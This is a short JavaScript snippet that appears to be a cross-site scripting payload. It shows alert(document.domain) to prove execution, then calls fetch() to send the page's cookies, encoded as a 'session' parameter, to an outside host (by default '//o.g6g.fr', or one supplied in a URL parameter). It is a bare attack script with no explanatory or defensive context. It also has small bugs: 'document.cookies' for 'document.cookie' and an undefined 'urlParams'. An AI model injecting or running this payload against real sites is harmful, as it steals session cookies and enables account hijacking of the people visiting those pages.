function main(){

    alert(document.domain)
    let serverOut = urlParams.get("serverOut")?? "//o.g6g.fr";
    if (!!serverOut){
        fetch(`${serverOut}?session=${encodeURIComponent(document.cookies)}`);
    }
}

main();